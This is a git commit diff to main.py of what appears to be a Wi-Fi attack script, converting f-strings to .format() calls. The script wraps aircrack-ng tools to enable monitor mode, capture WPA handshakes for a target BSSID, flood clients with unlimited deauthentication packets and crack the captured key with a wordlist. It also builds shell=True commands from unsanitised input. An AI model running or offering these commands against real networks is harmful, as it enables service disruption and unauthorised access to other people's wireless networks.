4e33fd8815c2a6ea70896dc61c1250bb70b0a4bd
allatfortheone <siddharthkaranala3@gmail.com>
2025-03-28 09:00:31 -0400

    Update main.py

--- main.py
+++ main.py
@@ -8,37 +8,38 @@ def print_banner():
 
 def run_command(command):
     try:
-        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        stdout, stderr = result.communicate()
         if result.returncode == 0:
-            print(result.stdout)
+            print(stdout)
         else:
-            print("Error:\n", result.stderr)
+            print("Error:\n", stderr)
     except Exception as e:
-        print(f"An error occurred: {e}")
+        print("An error occurred: {}".format(e))
 
 def enable_monitor_mode(interface):
-    print(f"Enabling monitor mode on {interface}...")
-    run_command(f"sudo airmon-ng start {interface}")
+    print("Enabling monitor mode on {}...".format(interface))
+    run_command("sudo airmon-ng start {}".format(interface))
 
 def disable_monitor_mode(interface):
-    print(f"Disabling monitor mode on {interface}...")
-    run_command(f"sudo airmon-ng stop {interface}")
+    print("Disabling monitor mode on {}...".format(interface))
+    run_command("sudo airmon-ng stop {}".format(interface))
 
 def scan_networks(interface):
     print("Scanning for networks...")
-    run_command(f"sudo airodump-ng {interface}")
+    run_command("sudo airodump-ng {}".format(interface))
 
 def capture_handshake(interface, bssid, channel, output_file):
-    print(f"Capturing handshake on {interface} for BSSID {bssid} on channel {channel}...")
-    run_command(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}")
+    print("Capturing handshake on {} for BSSID {} on channel {}...".format(interface, bssid, channel))
+    run_command("sudo airodump-ng -c {} --bssid {} -w {} {}".format(channel, bssid, output_file, interface))
 
 def deauthenticate_clients(interface, bssid):
-    print(f"Deauthenticating clients on {interface} for BSSID {bssid}...")
-    run_command(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}")
+    print("Deauthenticating clients on {} for BSSID {}...".format(interface, bssid))
+    run_command("sudo aireplay-ng --deauth 0 -a {} {}".format(bssid, interface))
 
 def crack_wpa_handshake(wordlist, capture_file):
     print("Cracking the WPA handshake...")
-    run_command(f"aircrack-ng -w {wordlist} {capture_file}")
+    run_command("aircrack-ng -w {} {}".format(wordlist, capture_file))
 
 if __name__ == "__main__":
     print_banner()
